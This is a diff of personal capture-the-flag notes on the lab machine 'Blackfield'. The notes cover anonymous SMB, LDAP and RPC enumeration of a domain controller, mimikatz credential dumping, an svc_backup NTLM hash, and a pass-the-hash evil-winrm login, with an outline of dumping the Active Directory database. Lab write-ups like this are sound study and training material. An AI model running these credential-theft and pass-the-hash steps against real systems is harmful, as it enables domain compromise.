@@ -8,27 +8,19 @@ WinRM privileges
 Dmp the Active Directory database
 Retrieve the hash of the primary domain administrator. 
 Robocopy + diskshadow - Dump Backup
+NTDIS == DB to store AD data
 #########
 BlackFIled:
 
 1-Enumeration:
     nmap -T5 -sV -sC -Pn 10.10.10.192  -oN enum/scan.log -vv
     PORT     STATE SERVICE       REASON  VERSION
-    53/tcp   open  domain        syn-ack Simple DNS Plus
     88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 23:57:12Z)
     135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
     389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
-    445/tcp  open  microsoft-ds? syn-ack
     593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
-    3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
 
-    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-    | smb2-security-mode:
-    |   311:
-    |_    Message signing enabled and required
-
- 
 
 SMB/LDAP:
     Enumerate LDAP:
@@ -43,12 +35,15 @@ SMB/LDAP:
     Try RPC connection:
     rpcclient -U "" -N 10.10.10.192
 
+
     enum4linux -a -u "" -p "" 10.10.10.192
     Domain Name: BLACKFIELD
     Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
 
+
     Enumeration DNS:
         nmap -Pn -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" 10.10.10.192
+
 
     Enumerate SMB:
         crackmapexec smb 10.10.10.192 -u "" -p "" --shares
@@ -68,6 +63,7 @@ SMB/LDAP:
                 NETLOGON        Disk      Logon server share
                 profiles$       Disk     
                 SYSVOL          Disk      Logon server share
+
 
     We get access:
         smbclient //10.10.10.192/profiles$
@@ -100,9 +96,7 @@ SMB/LDAP:
         rpcclient -U "support" 10.10.10.192      
             Password for [WORKGROUP\support]:
             rpcclient $> enumdomusers
-                user:[Administrator] rid:[0x1f4]
-                user:[Guest] rid:[0x1f5]
-                user:[krbtgt] rid:[0x1f6]
+                ....
                 user:[audit2020] rid:[0x44f]
                 user:[support] rid:[0x450]
                 user:[svc_backup] rid:[0x585]
@@ -110,19 +104,7 @@ SMB/LDAP:
 
             rpcclient $> enumdomgroups
                 group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-                group:[Domain Admins] rid:[0x200]
-                group:[Domain Users] rid:[0x201]
-                group:[Domain Guests] rid:[0x202]
-                group:[Domain Computers] rid:[0x203]
-                group:[Domain Controllers] rid:[0x204]
-                group:[Schema Admins] rid:[0x206]
-                group:[Enterprise Admins] rid:[0x207]
-                group:[Group Policy Creator Owners] rid:[0x208]
-                group:[Read-only Domain Controllers] rid:[0x209]
-                group:[Cloneable Domain Controllers] rid:[0x20a]
-                group:[Protected Users] rid:[0x20d]
-                group:[Key Admins] rid:[0x20e]
-                group:[Enterprise Key Admins] rid:[0x20f]
+                ....
                 group:[DnsUpdateProxy] rid:[0x44e]
             rpcclient $> 
 
@@ -159,6 +141,7 @@ SMB/LDAP:
             sekurlsa::logonpasswords full 
 
     We found the svc_backup NTLM Hash 
+
 
 2-Exploit:
     $ evil-winrm -i 10.10.10.192 -u svc_backup  -H '9658d1d1dcd9250115e2205d9f48400d'
